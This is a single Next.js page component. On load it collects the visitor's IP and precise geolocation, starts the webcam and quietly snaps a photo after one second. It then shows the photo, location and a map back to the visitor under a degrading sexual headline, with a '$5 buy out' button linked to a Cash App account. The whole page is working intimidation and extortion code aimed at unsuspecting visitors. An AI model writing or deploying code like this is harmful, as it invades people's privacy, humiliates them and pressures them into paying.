'use client';

import React, { useEffect, useRef, useState } from 'react';
import Image from 'next/image';

interface LocationData {
  city?: string;
  region?: string;
  country_name?: string;
  latitude?: number;
  longitude?: number;
  accuracy?: number;
}

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [hasPermission, setHasPermission] = useState(false);
  const [capturedImage, setCapturedImage] = useState<string | null>(null);
  const [isCameraActive, setIsCameraActive] = useState(true);
  const [ipAddress, setIpAddress] = useState<string>('');
  const [location, setLocation] = useState<LocationData | null>(null);
  const [isUsingPreciseLocation, setIsUsingPreciseLocation] = useState(false);
  const [hasLocationPermission, setHasLocationPermission] = useState(false);
  const [locationDenied, setLocationDenied] = useState(false);

  useEffect(() => {
    const getIp = async () => {
      try {
        const response = await fetch('/api/get-ip');
        const data = await response.json();
        setIpAddress(data.ip);
        
        // Simple location request
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              try {
                const locationResponse = await fetch('/api/get-ip-location');
                const locationData = await locationResponse.json();
                
                setLocation({
                  ...locationData,
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy
                });
                setIsUsingPreciseLocation(true);
                setHasLocationPermission(true);
              } catch (error) {
                console.error('Error getting location data:', error);
                setLocationDenied(true);
              }
            },
            (error) => {
              console.error("Location error:", error);
              setLocationDenied(true);
              setHasLocationPermission(false);
            }
          );
        }
      } catch (error) {
        console.error('Error getting IP or location:', error);
        setLocationDenied(true);
      }
    };

    getIp();
  }, []);

  useEffect(() => {
    const requestCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }
        setHasPermission(true);
        
        // Take picture after 1 second delay
        setTimeout(() => {
          takePicture();
        }, 1000);
      } catch (err) {
        console.error('Error accessing camera:', err);
        setIsCameraActive(false);
      }
    };

    requestCamera();
  }, []);

  const takePicture = () => {
    if (videoRef.current) {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext('2d');
      
      if (ctx && videoRef.current) {
        ctx.drawImage(videoRef.current, 0, 0);
        const imageDataURL = canvas.toDataURL('image/jpeg');
        setCapturedImage(imageDataURL);
        
        // Stop the camera and hide it
        const stream = videoRef.current.srcObject as MediaStream;
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        setIsCameraActive(false);
      }
    }
  };

  const handleBuyOut = () => {
    window.location.href = 'https://cash.app/$wednesday997';
  };

  const showLocationInfo = !isCameraActive && hasLocationPermission;

  // If location was denied, show blank page
  if (locationDenied) {
    return (
      <main className="min-h-screen relative flex flex-col items-center justify-center p-4 overflow-hidden">
        <Image
          src="/images/catgirl.png"
          alt="Background"
          fill
          className="object-cover"
          priority
          quality={100}
        />
        <div className="absolute inset-0 bg-black/30 z-10" />
        <div className="relative z-20 w-full max-w-4xl mx-auto">
          <h1 className="text-6xl font-bold text-white mb-4 font-cursive text-center shadow-lg">
            such a pretty clickslut
          </h1>
          <div className="flex justify-center">
            <button
              onClick={handleBuyOut}
              className="mt-8 px-8 py-3 bg-pink-500 hover:bg-pink-600 text-white text-2xl font-cursive rounded-full shadow-lg transform hover:scale-105 transition-all duration-200 border-2 border-white/20 backdrop-blur-sm"
            >
              $5 buy out
            </button>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen relative flex flex-col items-center justify-center p-4 overflow-hidden">
      {/* Background image */}
      <Image
        src="/images/catgirl.png"
        alt="Background"
        fill
        className="object-cover"
        priority
        quality={100}
      />
      
      {/* Overlay */}
      <div className="absolute inset-0 bg-black/30 z-10" />

      {/* Content */}
      <div className="relative z-20 w-full max-w-4xl mx-auto">
        <h1 className="text-6xl font-bold text-white mb-4 font-cursive text-center shadow-lg">
          such a pretty clickslut
        </h1>

        {showLocationInfo && (
          <div className="text-white text-2xl mb-8 font-cursive text-center shadow-md animate-fade-in">
            IP: {ipAddress}
            {location && (
              <div className="mt-2 text-xl">
                📍 {location.city}, {location.region}, {location.country_name}
                <div className="text-sm opacity-75 mt-1">
                  {isUsingPreciseLocation ? 
                    "(using your precise location)" : 
                    "(approximate location based on IP)"
                  }
                </div>
              </div>
            )}
          </div>
        )}
        
        <div className="relative flex flex-col items-center">
          {isCameraActive ? (
            <video
              ref={videoRef}
              autoPlay
              playsInline
              className="w-96 h-72 object-cover rounded-lg shadow-xl"
            />
          ) : (
            <div className="w-96 h-72 bg-black/50 rounded-lg flex flex-col items-center justify-center shadow-xl backdrop-blur-sm">
              {capturedImage && (
                <img 
                  src={capturedImage} 
                  alt="Captured photo" 
                  className="w-full h-full object-cover rounded-lg"
                />
              )}
            </div>
          )}
          
          {/* Map */}
          {showLocationInfo && location && location.latitude && location.longitude && (
            <div className="mt-4 w-96 h-48 rounded-lg overflow-hidden shadow-xl animate-fade-in">
              <iframe
                width="100%"
                height="100%"
                frameBorder="0"
                style={{ border: 0 }}
                src={`https://www.openstreetmap.org/export/embed.html?bbox=${location.longitude-0.05},${location.latitude-0.05},${location.longitude+0.05},${location.latitude+0.05}&layer=mapnik&marker=${location.latitude},${location.longitude}`}
              />
            </div>
          )}
          
          {/* Buy Out Button */}
          <button
            onClick={handleBuyOut}
            className="mt-8 px-8 py-3 bg-pink-500 hover:bg-pink-600 text-white text-2xl font-cursive rounded-full shadow-lg transform hover:scale-105 transition-all duration-200 border-2 border-white/20 backdrop-blur-sm"
          >
            $5 buy out
          </button>
        </div>
      </div>
    </main>
  );
} 